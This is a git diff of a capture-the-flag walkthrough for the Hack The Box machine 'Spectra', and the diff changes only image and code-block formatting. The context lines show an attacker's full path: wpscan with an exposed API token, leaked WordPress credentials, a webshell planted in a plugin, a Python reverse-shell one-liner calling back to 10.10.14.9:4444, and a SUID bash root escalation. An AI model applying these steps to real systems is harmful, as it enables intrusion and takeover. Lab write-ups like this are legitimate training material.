@@ -45,11 +45,10 @@ When the page HTML is viewed, we can see where the link takes us.
 
 After adding `spectra.htb` to the `/etc/hosts` file, we can take a look at what software the websites are running. The first website brought me to a Wordpress site:
 
-<figure><img src="../../../.gitbook/assets/image (4214).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(4214).png>)
 
 We can use `wpscan` to enumerate the website for us. This was an older machine, so Wordpress Core will definitely be outdated. There were quite a few plugins found to be outdated, but I didn't manage to exploit them. `wpscan` did find one user though:
 
-{% code overflow="wrap" %}
 ```
 $ wpscan --api-token OaDWLYrOpxOTaXsUq9DUaM8WuIDhSSJ1Ifkyujyn2l0 --enumerate p,u,t --plugins-detection aggressive --url spectra.htb/main/
 
@@ -62,15 +61,14 @@ $ wpscan --api-token OaDWLYrOpxOTaXsUq9DUaM8WuIDhSSJ1Ifkyujyn2l0 --enumerate p,u
  |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
  |  Login Error Messages (Aggressive Detection)
 ```
-{% endcode %}
 
 Anyways, moving to the `testing/index.php` site, it just shows us an error:
 
-<figure><img src="../../../.gitbook/assets/image (4215).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(4215).png>)
 
 Loading the `/testing` directory shows us a listing:
 
-<figure><img src="../../../.gitbook/assets/image (4216).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(4216).png>)
 
 What's interesting was the `.save` file, which could actually be read with `curl` to find credentials:
 
@@ -109,11 +107,11 @@ define( 'DB_PASSWORD', 'devteam01' );
 
 Using this password, we can login as `administrator` to the Wordpress site. Using this, I tried to get a reverse shell by manipulating the `404.php` within the theme being used.
 
-<figure><img src="../../../.gitbook/assets/image (4217).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(4217).png>)
 
 However, this error popped up:
 
-<figure><img src="../../../.gitbook/assets/image (4218).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(4218).png>)
 
 We'll have to find a different method to get a shell.
 
@@ -121,21 +119,19 @@ We'll have to find a different method to get a shell.
 
 There are 2 plugins installed on the site:
 
-<figure><img src="../../../.gitbook/assets/image (4219).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(4219).png>)
 
 Instead of finding a public exploit, we can actually edit the plugin directly on Wordpress. Using the Plugin Editor, I replaced the PHP code with a webshell. In this case, I replaced the code for `akismet.php`, and it can be triggered using `curl`:
 
-<figure><img src="../../../.gitbook/assets/image (4220).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(4220).png>)
 
 Then, we can easily get a reverse shell:
 
-{% code overflow="wrap" %}
 ```bash
 $ curl -G --data-urlencode "cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.9\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'" http://spectra.htb/main/wp-content/plugins/akismet/akismet.php
 ```
-{% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (4221).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(4221).png>)
 
 ## Privilege Escalation
 
@@ -216,7 +212,7 @@ SummerHereWeCome!!
 
 Using this, we can `ssh` in as `katie`.
 
-<figure><img src="../../../.gitbook/assets/image (4222).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(4222).png>)
 
 ### Sudo Privileges -> Root
 
@@ -304,4 +300,4 @@ end script
 
 I added `chmod u+s /bin/bash` to `test2.conf`, and then started the process. Then, we can easily get a `root` shell:
 
-<figure><img src="../../../.gitbook/assets/image (4223).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(4223).png>)
